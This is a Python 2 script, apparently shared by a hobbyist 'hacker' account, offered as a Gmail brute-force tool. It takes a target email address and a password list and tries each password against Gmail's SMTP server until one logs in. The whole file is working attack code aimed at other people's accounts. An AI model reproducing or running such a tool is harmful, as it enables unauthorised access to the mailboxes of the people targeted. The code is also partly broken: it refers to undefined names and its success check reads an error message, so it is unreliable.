#!/usr/bin/python2
#coding=utf-8

import smtplib, time, sys, os, requests
from os import system
system('clear')
W = '\x1b[0m'
r = '\x1b[31;1m'
y = '\x1b[33;1m'
b = '\x1b[34;1m'
c = '\x1b[36;1m'
g = '\x1b[32;1m'

def asw():
    mmk(r + ('_____ _____ _____  _   _    ___  _________  ___').center(44))
    mmk(r + ('|_   _|  ___/  __ \| | | |  / _ \ | ___ \  \/  |').center(44))
    mmk(y + ('| | | |__ | /  \/| |_| | / /_\ \| |_/ / .  . |').center(44))
    mmk(y + ('| | |  __|| |    |  _  | |  _  || ___ \ |\/| |').center(44))
    mmk(x + ('| | | |___| \__/\| | | | | | | || |_/ / |  | |').center(44))
    mmk(x + ('\_/ \____/ \____/\_| |_/ \_| |_/\____/\_|  |_/\').center(44))
    mmq(g + '-' * 45)
    mmk(c + 'Author   : Tech Abm ')
    mmk(c + 'Type     : Brute Force Gmail ')
    mmk(c + 'Github   : https://github.com/Tech-abm')
    mmk(c + 'Fb Page   : https://m.facebook.com/Techabm')
    mmq(W + '-' * 45)


def wl():
    os.system('nano Abmhacker.txt')


def ex():
    print W + ''
    exit()


def mmk(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.001)


def mmq(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(1e-43)


def main():
    asw()
    mmq(W + '-' * 45)
    print y + '1.' + g + '>> Brute Gmail'
    print y + '2.' + g + '>> Create Password list'
    print y + '0. ' + g + 'exit\n'
    mmq(W + '-' * 45)
    kntd = raw_input(c + 'Slect Option ' + r + ': ' + g)
    if kntd == '1':
        login()
    elif kntd == '2':
        wl()
    elif kntd == '0':
        print r + 'God by '
        system('clear')
        ex()
    else:
        if kntd == '':
            print r + 'Input Chose'
            return main()
        aska()


def login():
    system('clear')
    asw()
    try:
        print r + ('[!] \x1b[33;1mMake sure the target email address is correct \x1b[31;1m[!]').center(44)
        print b + ('[ DATA ]').center(44)
        user_name = raw_input(g + 'Target email  : ' + c)
        ppq = user_name
        if ppq == '':
            print r + '[!] Input Email'
            time.sleep(1)
            login()
        ktl = raw_input(g + 'Password ListðŸ‘‰(Abmhacker.txt): ' + c)
        mmq(W + '-' * 45)
        try:
            requests.post('https://google.com')
            pass_file = open(ktl, 'r')
            pass_list = pass_file.readlines()
            i = 0
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            mmk(y + 'Crack With ' + str(len(pass_list)) + ' password :')
            for password in pass_list:
                i = i + 1
                try:
                    kantal = server.login(user_name, password)
                    if kantal:
                        mmq(W + '-' * 45)
                        mmk(b + ('[ SUCCESS ]').center(44))
                        mmk(g + '[-] Username : ' + c + user_name)
                        mmk(g + '[-] Password : ' + c + password)
                        mmq(W + '-' * 45)
                        break
                    else:
                        mmq(g + str(i) + r + password + y + '  - Not Found,Try Again -' + W)
                        time.sleep(1e-43)
                except smtplib.SMTPAuthenticationError as e:
                    error = str(e)
                    if error[14] == '<':
                        mmq(W + '-' * 45)
                        mmk(b + ('[ SUCCESS ]').center(44))
                        mmk(g + '[-] Username : ' + c + user_name)
                        mmk(g + '[-] Password : ' + c + password)
                        mmq(W + '-' * 45)
                    else:
                        mmq(g + str(i) + '. ' + r + password + y + '  - Not Found,Try Again -' + W)
                        time.sleep(1e-43)
                except KeyboardInterrupt:
                    print '[!] Stopped'
                    time.sleep(1)
                    main()
                except requests.exceptions.ConnectionError:
                    print r + '[!] Connection Error'
                    time.sleep(1)
                    ex()

        except KeyboardInterrupt:
            print '[!] Stopped'
            time.sleep(1)
            main()
        except requests.exceptions.ConnectionError:
            print r + '[!] Connection Error'
            time.sleep(1)
            ex()

    except KeyboardInterrupt:
        print '[!] Stopped'
        time.sleep(1)
        main()
    except requests.exceptions.ConnectionError:
        print r + '[!] Connection Error'
        time.sleep(1)
        ex()
    except IOError:
        print r + '[!] File Not Found'
        time.sleep(2)
        login()


main()
